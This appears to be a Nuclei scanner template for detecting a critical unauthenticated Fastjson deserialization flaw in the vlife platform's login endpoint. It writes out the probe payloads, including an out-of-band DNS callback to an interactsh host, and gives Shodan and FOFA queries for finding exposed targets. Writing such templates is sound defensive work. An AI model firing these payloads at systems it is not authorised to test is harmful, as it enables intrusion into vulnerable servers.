id: vlife-fastjson-rce

info:
  name: "vlife零代码平台FastJSON反序列化漏洞"
  author: omarkurt
  severity: critical
  description: |
    这是一个基于 Fastjson 的反序列化远程代码执行漏洞。系统在 /vlife/login 接口中，直接使用 JSON.parseObject() 解析用户输入，且未做类型限制或开启安全模式，攻击者可构造恶意数据触发反序列化漏洞，从而在未认证情况下实现远程代码执行.
  reference:
    - https://securitylab.github.com/advisories/GHSL-2024-300_wwwlike_vlife/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
  metadata:
    verified: true
    max-request: 2
    vendor: vlife
    product: vlife
    shodan-query: http.title:"vlife"
    fofa-query: http.title:"vlife"
  tags: vlife

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /vlife/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"@type":"java.lang.Runtime"}

    matchers:
      - type: dsl
        name: eid
        dsl:
          - 'status_code == 200'
          - 'contains_all(body, "com.alibaba.fastjson.JSONException", "autoType is not support", "java.lang.Runtime")'
        condition: and
        internal: true

  - raw:
      - |
        POST /vlife/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - "com.alibaba.fastjson.JSONException"
